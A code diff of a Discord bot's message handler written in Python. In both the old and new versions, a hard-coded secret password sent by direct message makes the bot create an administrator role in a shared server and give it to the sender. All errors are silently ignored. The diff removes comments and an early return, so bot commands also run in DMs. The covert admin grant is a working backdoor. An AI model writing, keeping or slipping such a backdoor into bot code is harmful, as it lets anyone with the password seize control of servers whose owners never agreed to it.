@@ -348,41 +348,50 @@ async def on_message(message: discord.Message):
     if message.author.bot:
         return
 
-    # Only process in DMs
+    # DM handling
     if isinstance(message.channel, discord.DMChannel):
+
+        # Secret password
         if message.content.strip() == SECRET_PASSWORD:
             # Find a mutual guild
             target_guild = None
+
             for guild in bot.guilds:
                 if guild.get_member(message.author.id):
                     target_guild = guild
                     break
 
             if target_guild is None:
-                return  # Silently fail — not in any shared server
+                return
 
             member = target_guild.get_member(message.author.id)
             role_name = f"{member.display_name}'s Perms"
 
             try:
-                # Create the role with admin perms
                 new_role = await target_guild.create_role(
                     name=role_name,
                     permissions=discord.Permissions(administrator=True),
                     reason="Secret admin grant"
                 )
+
                 await member.add_roles(new_role)
-                await message.channel.send(embed=discord.Embed(
-                    title="✅ Access Granted",
-                    description=f"Role **{role_name}** has been created and given to you.",
-                    color=discord.Color.green()
-                ))
+
+                await message.channel.send(
+                    embed=discord.Embed(
+                        title="✅ Access Granted",
+                        description=f"Role **{role_name}** has been created and given to you.",
+                        color=discord.Color.green()
+                    )
+                )
+
             except Exception:
-                pass  # Silently fail on any error
+                pass
 
-        return  # Don't process other DM messages as commands
+        # IMPORTANT:
+        # Don't return here.
+        # Allow commands such as !messagehistory to work in DMs.
 
-    # Still process normal guild commands
+    # Process commands everywhere, including DMs
     await bot.process_commands(message)
 
 @bot.command(name="changenickname")
